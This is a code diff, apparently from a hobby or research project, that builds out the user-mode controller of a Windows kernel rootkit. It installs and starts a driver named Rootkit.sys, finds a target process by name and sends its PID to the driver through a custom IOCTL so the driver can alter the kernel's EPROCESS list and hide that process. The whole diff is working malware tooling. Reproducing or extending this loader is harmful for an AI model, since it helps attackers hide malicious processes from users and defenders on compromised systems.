@@ -6,10 +6,31 @@
 #define DEVICE "\\\\.\\Rootkit"
 #define DRIVER "c:\\\\Windows\\System32\\drivers\\Rootkit.sys"
 
+// IRP code that will call our rootkit functionality
+#define IRP_ROOTKIT_CODE 0x900 
 
+int call_kernel_driver(char * pid, HANDLE hDevice){
 
-int call_kernel_driver(){
-    printf("%s\n", "Calling Driver...");
+    printf("%s %d\n", "[+] Calling Driver, hiding PID:", atoi(pid));
+
+    ULONG bytes_returned;
+
+    BOOLEAN call_result = DeviceIoControl(
+        hDevice,
+        IRP_ROOTKIT_CODE,
+        pid,
+        strlen(pid) + 1,
+        NULL,
+        0,
+        &bytes_returned,
+        (LPOVERLAPPED) NULL);
+
+    if (!call_result) {
+        printf("[-] Error sending IRP to driver: %s \n", GetLastErrorAsString());
+        return;
+    }
+
+    printf("%s\n", "[+] IRP Sent, look for your process!");
 }
 
 BOOL load_driver(SC_HANDLE svcHandle) {
@@ -94,7 +115,7 @@ HANDLE install_driver() {
     
         printf("[+] SCM database entry added.\n");
 
-        // Check if newly installed driver didn't load properly
+        // Attempt to start newly added driver
         if(!load_driver(hService)){
             goto cleanup;
         }
@@ -115,9 +136,13 @@ HANDLE install_driver() {
 
     // Check to ensure a valid handle
     if (hDevice == INVALID_HANDLE_VALUE) {
-        printf("[-] Error creating handle: %s \n", GetLastErrorAsString());
-        hDevice = NULL;
-        goto cleanup;
+
+        // Check if installed driver didn't start properly
+        if(!load_driver(hService)){
+            printf("[-] Error creating handle: %s \n", GetLastErrorAsString());
+            hDevice = NULL;
+            goto cleanup;
+        }
     }
 
 // Cleanup and return
@@ -172,18 +197,13 @@ int main(int argc, char *argv[])
 
     // Exit if PID not found
     if (pid == 0) {
+        printf("[-] Process %s not found.\n", argv[1]);
         exit(2);
     }
 
 
     printf("\n[+] Discovered PID of process %s: %d\n", argv[1], pid);
 
-    // Lock access to EPROCESS list using the IRQL (Interrupt Request Level) approach
-    
-    //KIRQL irql;
-    //PKDPC dpcPtr;
-    //irql = RaiseIRQL();
-    //dpcPtr = AquireLock();
     
     // Grab handle to our rootkit driver
     hDevice = install_driver();
@@ -193,16 +213,14 @@ int main(int argc, char *argv[])
         exit(1);
     }
 
-    printf("[+] Recieved driver handle.");
-    //printf("[-] Could not lock EPROCESS list.");
-    
+    printf("[+] Recieved driver handle.\n");
 
-    // Modify the EPROCESS list
+    // Convert PID to buffer to pass to driver
+    char buffer[32];
+    sprintf(buffer,"%ld", pid);
 
-
-    // Release access to the EPROCESS list and exit
-    //ReleaseLock(dpcPtr);
-    //LowerIRQL(irql); 
+    // Call driver to modify the EPROCESS list
+    call_kernel_driver(buffer, hDevice);
 
     CloseHandle(hDevice);
     return 0;
